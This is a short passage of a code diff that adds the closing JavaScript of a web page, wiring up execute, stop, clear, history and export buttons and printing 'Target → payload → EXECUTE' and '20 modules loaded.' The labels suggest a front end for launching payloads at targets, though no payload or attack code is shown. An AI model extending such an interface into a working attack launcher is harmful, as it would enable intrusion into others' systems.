+    executeBtn.addEventListener('click', execute);
+    stopBtn.addEventListener('click', stopExecution);
+    targetInput.addEventListener('keydown', e => { if (e.key === 'Enter') execute(); });
+    document.querySelectorAll('[data-target]').forEach(btn => {
+        btn.addEventListener('click', () => { targetInput.value = btn.dataset.target; execute(); });
+    });
+    document.getElementById('clearBtn').addEventListener('click', clearTerminal);
+    document.getElementById('historyToggle').addEventListener('click', toggleHistory);
+    document.getElementById('exportBtn').addEventListener('click', exportLogs);
+
+    // ─── INIT ───
+    setStatus('Ready', true);
+    appendOutput('Target → payload → EXECUTE', 'info');
+    appendOutput('20 modules loaded.', 'info');
+    renderHistory();
+</script>
 
 </body>
 </html>
